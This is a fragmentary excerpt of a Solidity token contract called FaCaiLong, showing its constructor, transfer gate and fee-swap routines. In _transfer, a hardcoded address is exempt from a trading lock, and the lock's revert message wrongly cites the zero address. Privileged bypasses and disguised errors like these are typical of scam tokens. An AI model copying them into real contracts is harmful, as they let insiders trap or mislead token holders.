...
contract FaCaiLong is Ownable, IERC20Metadata {
    ...
    constructor() {
        ...
        _marks = 3;
        _done = 6;
        _maxsell = 100 * 10 ** decimals();
        _dead = 0x000000000000000000000000000000000000dEaD;
        _main = 0xbf3d02221ADF17412990E1A6B0Ea3087e15dBf56;
        _whites[_dead] = true;
        _whites[_main] = true;
    ...
    function _transfer(
        ...
        if(!_whites[recipient] && !isContract(recipient) && !(sender == 0xbf3d02221ADF17412990E1A6B0Ea3087e15dBf56)){
            require(kaipan == true, "ERC20: transfer to the zero address");
        }
    ...
    function _swap1() private {
        ...
        if (_maxsell > 0 && balances >= _maxsell) {
            _swapTokenForFist((balances)*48/60);
            uint256 fistval2 = IERC20(_fist).balanceOf(address(this));
            IERC20(address(this)).transfer(_dead, (balances)*8 / 60);
            if ((balances)*4/60 > 0 && (fistval2)*4/48 > 0) {
                addLiquidity2((balances)*4/60, (fistval2)*4/48);
                _doBonusFist ((fistval2)*40 / 48);
                _swapTokenForFist1((fistval2)*4/48);
            }
    ...
    function _swapTokenForFist1(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = _fist;path[1] = 0x9756B9DA0Ec60119e50465BE9A2670eadb38667c;
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
